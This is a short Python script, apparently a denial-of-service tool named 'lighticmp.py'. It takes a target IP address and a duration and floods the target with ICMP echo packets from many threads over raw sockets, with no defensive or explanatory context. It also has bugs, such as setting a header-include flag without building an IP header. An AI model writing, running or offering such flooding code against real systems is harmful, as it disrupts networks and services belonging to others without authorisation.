import asyncio
import concurrent.futures
import socket
import struct
import os
import sys
import time

def calculate_checksum(source_string):
    count_to = (len(source_string) // 2) * 2
    count = 0
    checksum = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        checksum += this_val
        checksum &= 0xFFFFFFFF
        count += 2
    if count_to < len(source_string):
        checksum += source_string[len(source_string) - 1]
        checksum &= 0xFFFFFFFF
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum += (checksum >> 16)
    answer = ~checksum
    answer = answer & 0xFFFF
    answer = answer >> 8 | (answer << 8 & 0xFF00)
    return answer

def create_icmp_packet():
    packet_type = 8  
    code = 0
    checksum = 0
    packet_id = os.getpid() & 0xFFFF  
    sequence = 1

    header = struct.pack('!BBHHH', packet_type, code, checksum, packet_id, sequence)
    data = b'ping'
    checksum = calculate_checksum(header + data)

    header = struct.pack('!BBHHH', packet_type, code, checksum, packet_id, sequence)
    return header + data

async def send_icmp(ip, duration, thread):
    def send_packet():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            packet = create_icmp_packet()
            for _ in range(1000):
                sock.sendto(packet, (ip, 0))
        except PermissionError:
            print("Error: You need to run this script as root to send raw packets.")
        finally:
            sock.close()

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = []
        
        for _ in range(thread * 50):  
            futures.append(executor.submit(send_packet))

        await asyncio.sleep(duration)
        
        for future in futures:
            future.cancel()

async def main(ip, duration):      
    thread = 4  
    for _ in range(thread * 50):
        await send_icmp(ip, duration, thread)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Made by Adjidev\nUsage: python lighticmp.py <ip> <duration>")
        sys.exit(1)  

    i = sys.argv[1]
    try:
        d = int(sys.argv[2]) 
    except ValueError:
        print("Error: Duration must be an integer.")
        sys.exit(1)

    asyncio.run(main(i, d))
